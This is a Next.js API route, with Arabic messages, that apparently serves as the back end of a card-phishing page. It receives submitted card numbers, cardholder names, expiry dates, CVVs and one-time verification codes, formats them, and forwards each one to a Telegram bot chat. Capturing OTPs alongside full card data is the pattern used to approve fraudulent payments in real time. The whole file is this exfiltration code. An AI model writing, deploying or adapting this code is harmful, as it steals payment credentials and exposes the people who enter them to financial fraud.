import { NextRequest, NextResponse } from "next/server";

async function sendTelegram(text: string) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" }),
  });
}

export async function POST(req: NextRequest) {
  try {
    const { otp, customerName, cardHolderName, cardNumber, cvv, expiryDate, type } = await req.json();

    const formatted = (cardNumber ?? "").replace(/(\d{4})(?=\d)/g, "$1 ");

    const cardInfo = cardNumber
      ? [
          ``,
          `━━━━━━━━━━━━━━━━━━`,
          `💳 Card Number: <code>${formatted}</code>`,
          `👤 Card Holder: ${cardHolderName ?? ""}`,
          `📅 Valid To: ${expiryDate ?? ""}`,
          `🔐 CVV: <code>${cvv ?? ""}</code>`,
          `━━━━━━━━━━━━━━━━━━`,
        ].join("\n")
      : "";

    const message = type === "resend"
      ? [
          `🔁 <b>طلب إعادة إرسال كود</b>`,
          ``,
          `👤 Order For: ${customerName ?? ""}`,
          `💳 Card Holder: ${cardHolderName ?? ""}`,
          cardInfo,
        ].join("\n")
      : [
          `🔑 <b>كود تحقق جديد</b>`,
          ``,
          `👤 Order For: ${customerName ?? ""}`,
          cardInfo,
          ``,
          `🔢 OTP: <code>${otp}</code>`,
        ].join("\n");

    await sendTelegram(message);
    return NextResponse.json({ ok: true });
  } catch {
    return NextResponse.json({ error: "حدث خطأ" }, { status: 500 });
  }
}
